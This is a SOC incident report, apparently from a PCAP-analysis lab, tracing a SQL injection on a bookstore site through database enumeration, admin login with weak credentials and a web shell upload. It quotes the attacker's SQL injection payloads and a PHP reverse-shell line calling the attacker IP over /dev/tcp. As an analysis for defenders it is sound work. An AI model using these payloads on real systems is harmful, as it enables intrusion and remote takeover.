# 📄 SOC Incident Handling Report  
**Incident Type:** Web Application Attack (SQL Injection → Web Shell Upload)  
**Prepared For:** SOC Analysts (Tier 1 / Tier 2)  
**Prepared By:** NISHOK KUMAR S
**Date of Analysis:** 23-Dec-2022  

---

## 1️⃣ Executive Summary

An automated SOC alert was triggered due to an **abnormal spike in database queries and server resource utilization** within BookWorld’s web environment. A detailed network-based investigation using PCAP analysis confirmed a successful external compromise of the web application.

The attacker exploited a **SQL Injection vulnerability** in a public-facing PHP script, performed **database enumeration**, accessed restricted administrative functionality, and uploaded a malicious PHP reverse shell, enabling **remote command execution** on the web server.

This incident represents a **high-severity compromise** with potential customer data exposure and system takeover risk.

---

## 2️⃣ Incident Metadata

| Field | Value |
|------|------|
| Incident ID | WEB-APP-217 |
| Organization | BookWorld |
| Detection Source | Network Monitoring / PCAP |
| Attack Vector | SQL Injection |
| Affected Component | Web Application |
| Severity | **High** |
| Status | Confirmed |
| Analyst Validation Required | Yes |

---

## 3️⃣ Initial Detection

The incident was detected due to:
- Sudden increase in SQL query volume
- Abnormally high HTTP traffic from a single external IP
- Elevated server resource utilization

Initial triage using Wireshark conversation statistics revealed a **single IP dominating traffic**, warranting further investigation.

---

## 4️⃣ Attacker Identification

### 4.1 Malicious Source IP

| Indicator | Value |
|--------|------|
| Attacker IP | `111.224.250.131` |
| Traffic Pattern | High-volume HTTP requests |
| Behavior | Repeated dynamic PHP access |

This IP was identified through:
- Conversation byte analysis
- TCP stream inspection
- HTTP request frequency anomalies

---

### 4.2 Geolocation Analysis

| Attribute | Value |
|--------|------|
| City | Shijiazhuang |
| Country | China |
| Business Relevance | None |

🔴 Traffic from this region is **unexpected and unauthorized**, indicating targeted malicious activity.

---

## 5️⃣ Reconnaissance Activity

### 5.1 Directory Enumeration

HTTP request patterns and TCP stream reconstruction show behavior consistent with **Gobuster-based directory brute-forcing**.

**Indicators observed:**
- Sequential directory probing
- Repeated `404` responses
- Discovery of restricted administrative directory

### 🔎 Discovered Directory

    /admin/

---

## 6️⃣ Initial Exploitation – SQL Injection

### 6.1 Vulnerable Component

| Attribute     | Value          |
|---------------|----------------|
| Script Name   | search.php     |
| Vulnerability | SQL Injection  |
| HTTP Response | 200 OK         |

Successful execution of injected SQL queries was confirmed through HTTP responses.

---

### 6.2 First Confirmed SQL Injection Attempt

    /search.php?search=book and 1=1; -- -

Earlier payloads included encoded single-quote testing (`book%27`), decoded and validated using CyberChef.

✔ Confirms deliberate SQL Injection exploitation.

---

## 7️⃣ Database Enumeration Activity

### 7.1 Database Discovery

The attacker enumerated backend databases using UNION-based SQL Injection.

    /search.php?search=book' UNION ALL SELECT 
    NULL, CONCAT(0x7178766271,
    JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b, schema_name)),
    0x7176706a71)
    FROM INFORMATION_SCHEMA.SCHEMATA-- -

🔍 Screenshots confirm successful enumeration via JSON-formatted responses.

---

### 7.2 Identified Database

| Database Name|
|--------------|
| bookworld_db |

---

### 7.3 Table Enumeration

| Table Name | Risk             |
|------------|------------------|
| customers  | High (User data) |
| admin      | High             |
| books      | Medium           |

The **customers** table contains sensitive website user information.

---

### 7.4 Column Enumeration

Hex-encoded SQL payloads were used to enumerate column names and data types, likely to evade detection.

| Attribute         | Value                   |
|-------------------|-------------------------|
| Table Schema      | bookworld_db            |
| Enumerated Tables | admin, customers, books |

---

## 8️⃣ Authentication Compromise

### 8.1 Admin Interface Access Flow

    /admin/login.php  
    /admin/index.php  
    /admin/upload.php  

This sequence confirms **successful administrative access**.

---

### 8.2 Credentials Used

| Username | Password  |
|----------|-----------|
| admin    | admin123! |

**Observed Failed Attempts:**
- admin : admin
- admin : changeme
- default : default

⚠️ Indicates weak credential usage.

---

## 9️⃣ Post-Exploitation Activity

### 9.1 Malicious File Upload

| Indicator       | Value             |
|-----------------|-------------------|
| File Name       | NVri2vhp.php      |
| Upload Location | /admin/upload.php |
| Result          | Successful        |

The filename appears in both upload requests and server acknowledgements.

---

### 9.2 Payload Analysis

    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/111.224.250.131/443 0>&1'"); ?>

🚨 This payload provides:
- Interactive reverse shell
- Remote command execution
- Persistent attacker access

---

## 🔟 Impact Assessment

### Confirmed Impacts

- SQL Injection exploitation
- Full database enumeration
- Exposure of customer data structure
- Administrative access compromise
- Remote shell execution on server

### Business Risk

- Potential data breach
- Reputational damage
- Compliance violations
- Risk of lateral movement

---

## 1️⃣1️⃣ Indicators of Compromise (IOCs)

### 11.1 Network Indicators

| Type        | Value           |
|-------------|-----------------|
| Attacker IP | 111.224.250.131 |
| SHA256 Hash (NVri2vhp.php)    | fe0e27b7170726fa576934d823b7da9037c1c93aa77cfe8ab2dde5ed0f45d7b8            |

---

### 11.2 Application Indicators

| Indicator             | Value        |
|-----------------------|--------------|
| Vulnerable Script     | search.php   |
| Malicious File        | NVri2vhp.php |
| Compromised Directory | /admin/      |

---

### 11.3 Credential Indicators

| Account | Credential        |
|---------|-------------------|
| Admin   | admin : admin123! |

---

## 1️⃣2️⃣ SOC Response Actions

- Block attacker IP at firewall/WAF
- Remove malicious PHP file
- Reset all administrative credentials
- Isolate affected server
- Conduct full forensic review
- Deploy SQL Injection WAF rules

---

## 1️⃣3️⃣ Final Classification

> **Confirmed Web Application Compromise with Remote Code Execution**

**MITRE ATT&CK Techniques:**
- T1190 – Exploit Public-Facing Application  
- T1059 – Command and Scripting Interpreter  
- T1505.003 – Web Shell  

---

## 📌 SOC Analyst Checklist

- [ ] Identify attacker IP  
- [ ] Confirm exploitation method  
- [ ] Enumerate attacker actions  
- [ ] Extract IOCs  
- [ ] Contain threat  
- [ ] Document incident  
- [ ] Close case  

---

**Status:** Closed  
**Confidence Level:** High
